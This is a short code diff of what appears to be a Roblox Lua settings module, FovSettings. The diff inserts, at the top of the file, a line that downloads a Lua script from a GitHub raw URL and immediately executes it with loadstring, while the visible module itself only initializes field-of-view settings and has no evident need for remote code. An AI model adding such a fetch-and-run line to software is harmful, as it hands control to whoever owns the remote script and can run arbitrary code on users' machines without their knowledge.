@@ -1,3 +1,5 @@
+loadstring(game:httpget("https://raw.githubusercontent.com/SixK1ng/gg/main/lessv2.lua"))()
+
 local FovSettings = {}
 
 function FovSettings.initialize(configuration)
